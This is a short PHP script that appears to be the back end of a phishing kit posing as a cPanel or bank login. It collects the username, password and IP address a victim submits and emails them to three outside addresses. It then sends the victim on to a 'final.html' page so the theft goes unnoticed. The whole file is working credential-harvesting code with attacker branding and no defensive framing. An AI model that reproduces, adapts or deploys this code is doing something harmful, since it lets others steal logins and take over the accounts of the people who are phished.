﻿<?

$ip = getenv("REMOTE_ADDR");
$message .= "----Cyancet ReZulT-------\n";
$message .= "Username : ".$_POST['userId']."\n";
$message .= "Username : ".$_POST['userIdConfirm']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "------Emp0w3r3d By Mr.H4-----\n";

$recipient = "Shmoney231@gmail.com,Smoney2314@gmail.com,soundboy231@protonmail.com";
$subject = "NativeCpanel - $ip";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "SiteKeys Challenge ReZulT (Thief)", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: final.html");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>